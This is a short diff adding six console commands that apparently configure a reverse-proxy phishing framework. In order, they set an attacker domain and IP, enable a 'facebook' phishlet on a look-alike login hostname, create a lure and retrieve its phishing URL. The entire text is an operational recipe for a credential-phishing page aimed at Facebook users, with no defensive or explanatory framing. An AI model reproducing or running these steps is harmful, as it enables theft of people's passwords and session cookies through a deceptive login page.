@@ -1,0 +1,6 @@
+: config domain yourdomain.com
+: config ip <YOUR_PUBLIC_IP>
+: phishlets hostname facebook login.yourdomain.com
+: phishlets enable facebook
+: lures create facebook
+: lures get-url 0
